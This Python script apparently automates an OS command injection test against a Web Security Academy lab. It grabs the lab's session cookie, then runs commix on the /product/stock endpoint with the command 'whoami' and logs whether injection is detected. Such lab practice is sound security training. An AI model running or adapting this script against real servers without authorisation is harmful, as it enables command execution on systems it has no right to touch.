import requests
import pexpect

url = "https://0a3d005504ae17ba8308700f007a0057.web-security-academy.net/"

session = requests.Session()
response = session.get(url)

cookies = session.cookies.get_dict()
session_id = cookies.get('session')

full_url = f"{url if url[-1] != '/' else url[:-1]}/product/stock"

command = [
    "python3", "commix.py",
    "--url", full_url,
    "--cookie", f'session="{session_id}"',
    "-d", "productId=1&storeId=1",
    "--batch",
    "--os-cmd", '"whoami"'
]

# Start the process with pexpect
child = pexpect.spawn(" ".join(command))

# Wait for the command to complete
child.expect(pexpect.EOF)

# Capture the output
output = child.before.decode()

# Print the output
print(output)

# Save the output to file
with open("output.txt", "w", encoding='utf-8') as output_file:
    output_file.write(f"Affected URL : {full_url}\n")
    output_file.write(output)

# Check for specific words in the output
if "injectable" in output.lower() or "injection" in output.lower():
    with open("output.txt", "a", encoding='utf-8') as output_file:
        output_file.write("Detected potential injection vulnerability.\n")